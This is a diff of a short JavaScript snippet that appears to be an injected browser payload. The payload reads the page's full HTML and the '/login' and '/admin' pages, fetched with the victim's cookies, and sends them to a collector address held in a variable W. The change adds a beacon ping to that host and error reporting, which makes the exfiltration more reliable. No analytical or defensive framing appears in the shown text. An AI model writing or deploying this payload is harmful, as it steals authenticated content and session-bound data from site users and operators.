@@ -7,10 +7,16 @@ const send = (k, v) => {
   }
 };
 
-send("html", document.documentElement.outerHTML);
+new Image().src = `${W}?ping=1`;
 
-for (const p of ["/login", "/admin"]) {
-  fetch(p, { credentials: "include" })
-    .then(r => r.text())
-    .then(t => send(p.slice(1), t));
+try {
+  send("html", document.documentElement.outerHTML);
+  for (const p of ["/login", "/admin"]) {
+    fetch(p, { credentials: "include" })
+      .then(r => r.text())
+      .then(t => send(p.slice(1), t))
+      .catch(e => send("err" + p.slice(1), e));
+  }
+} catch (e) {
+  new Image().src = `${W}?err=${encodeURIComponent(String(e))}`;
 }
